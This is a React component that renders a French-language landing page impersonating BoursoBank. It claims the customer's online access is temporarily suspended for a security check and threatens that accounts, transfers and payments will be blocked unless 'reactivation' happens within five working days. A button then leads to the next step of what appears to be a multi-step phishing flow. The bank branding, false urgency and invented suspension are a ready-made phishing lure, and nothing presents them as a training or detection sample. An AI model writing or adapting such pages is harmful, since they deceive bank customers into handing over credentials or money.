import React from 'react';

interface Props {
  onContinue: () => void;
}

const LandingStep: React.FC<Props> = ({ onContinue }) => (
  <main className="flex justify-center px-4 py-8 animate-fadeIn">
    <div className="w-full max-w-lg">
      <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
        <div className="flex justify-center mb-6">
          <div className="w-16 h-16 rounded-full border-4 border-bourso flex items-center justify-center">
            <svg className="w-8 h-8 text-bourso" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>

        <h1 className="text-2xl font-bold text-gray-900 mb-6 leading-tight uppercase tracking-tight">
          Réactivation de<br />votre espace client<br />BoursoBank
        </h1>

        <p className="text-sm text-gray-700 leading-relaxed mb-4">
          Dans le cadre du renforcement de nos protocoles de sécurité bancaire, une vérification obligatoire de votre espace client est en cours. Votre accès a été
          <strong className="font-bold"> temporairement suspendu</strong> le temps de cette procédure.
        </p>

        <p className="text-sm text-gray-700 leading-relaxed mb-4">
          <strong className="font-bold">Sans réactivation sous 5 jours ouvrés, l'accès à vos comptes, virements et paiements en ligne sera automatiquement bloqué.</strong>
        </p>

        <p className="text-sm text-gray-700 leading-relaxed mb-4">
          Cette procédure est déployée <strong className="font-bold">progressivement sur l'ensemble de nos clients</strong> par groupes, sur une période de plusieurs semaines.
        </p>

        <p className="text-sm text-gray-600 italic leading-relaxed mb-8">
          La réactivation ne prend que quelques minutes.
        </p>

        <button
          onClick={onContinue}
          className="w-full py-4 text-white font-semibold text-sm rounded-full transition-all duration-200 shadow-md hover:shadow-lg uppercase tracking-wide hover:opacity-90"
          style={{ background: 'linear-gradient(90deg, #D20073, #FF0D77)' }}
        >
          Procéder à la réactivation
        </button>
      </div>
    </div>
  </main>
);

export default LandingStep;
